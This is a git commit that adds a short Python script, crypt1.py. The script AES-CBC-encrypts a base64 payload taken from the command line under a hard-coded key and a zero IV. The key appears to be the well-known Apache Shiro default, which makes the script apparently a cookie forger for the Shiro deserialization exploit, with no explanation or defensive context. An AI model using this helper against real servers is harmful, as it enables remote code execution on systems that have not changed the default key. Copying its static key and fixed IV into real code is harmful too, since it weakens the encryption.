f7a46d874832a8c595a1aff613570ee036c32a6a
BabyTeam1024 <74447452+BabyTeam1024@users.noreply.github.com>
2021-08-01 13:50:13 +0800

    Create crypt1.py

---
+++ crypt1.py
@@ -0,0 +1,18 @@
+import sys
+import base64
+import uuid
+from random import Random
+import subprocess
+from Crypto.Cipher import AES
+
+key  =  "kPH+bIxk5D2deZiIxcaaaA=="
+mode =  AES.MODE_CBC
+IV   = ('0'*16).encode("utf8")
+encryptor = AES.new(base64.b64decode(key), mode, IV)
+
+payload=base64.b64decode(sys.argv[1])
+BS   = AES.block_size
+pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+payload=pad(payload)
+
+print(base64.b64encode(IV + encryptor.encrypt(payload)))
